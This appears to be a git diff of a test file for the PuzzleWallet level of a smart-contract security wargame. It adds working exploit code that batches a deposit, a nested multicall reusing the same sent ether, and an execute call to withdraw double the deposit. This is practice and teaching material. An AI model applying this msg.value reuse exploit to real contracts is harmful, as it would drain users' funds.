@@ -1,3 +1,4 @@
+const ethutil = require('ethereumjs-util')
 const PuzzleWalletFactory = artifacts.require('./levels/PuzzleWalletFactory.sol')
 const PuzzleWallet = artifacts.require('./attacks/PuzzleWallet.sol')
 
@@ -27,19 +28,24 @@ contract('PuzzleWallet', function(accounts) {
 
     assert.equal(await instance.owner(), level.address)
     assert.equal(web3.utils.toWei('1', 'ether'), (await instance.balances(level.address)).toString())
-    
+
     // TODO: take ownership in a real way
     await instance.takeOwnership({from: player})
-    assert.equal(player, await instance.owner())
-    
+
     // Player whitelists herself
     await instance.addToWhitelist(player, { from: player })
 
+    const { data: depositData } = await instance.deposit.request(web3.utils.toWei('1', 'ether'))
+    const { data: nestedMulticallData } = await instance.multicall.request([ depositData ])
+    const { data: executeData } = await instance.execute.request(player, web3.utils.toWei('2', 'ether'), [])
+
     const calls = [
-      // TODO: calls
+      depositData,
+      nestedMulticallData,
+      executeData,
     ]
 
-    await instance.multicall(calls)
+    await instance.multicall(calls, { from: player, value: web3.utils.toWei('1', 'ether')})
 
     // Factory check
     const ethCompleted = await utils.submitLevelInstance(
